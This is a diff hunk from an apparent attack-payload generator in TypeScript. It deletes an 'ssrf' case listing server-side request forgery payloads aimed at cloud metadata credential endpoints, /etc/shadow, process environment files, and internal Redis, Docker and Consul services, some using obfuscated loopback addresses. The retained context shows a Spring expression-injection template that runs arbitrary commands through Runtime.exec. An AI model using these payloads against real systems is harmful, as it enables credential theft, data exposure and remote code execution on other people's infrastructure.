@@ -500,32 +500,6 @@ export function generateSuggestions(
     case "container":
       return buildContainerEscapes(b);
 
-    case "ssrf":
-      return [
-        "http://169.254.169.254/latest/meta-data/",
-        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-        "http://169.254.169.254/latest/user-data",
-        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
-        "http://100.100.100.200/latest/meta-data/",
-        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-        "file:///etc/passwd",
-        "file:///etc/shadow",
-        "file:///proc/self/environ",
-        "file:///proc/net/tcp",
-        "dict://localhost:6379/INFO",
-        "gopher://localhost:6379/_INFO",
-        "ldap://localhost:389/%00",
-        "http://localhost:9200/_cat/indices",
-        "http://localhost:8500/v1/kv/?recurse",
-        "http://localhost:2375/containers/json",
-        "http://127.0.0.1:6379/",
-        "http://0x7f000001/",
-        "http://2130706433/",
-        "http://localhost:4566/",
-        "http://localhost:5601/",
-      ];
-
-    
     case "spring":
       return [
         `${"${"}T(java.lang.Runtime).getRuntime().exec('${b.replace(/'/g,"\\'")}')${"}"}`,
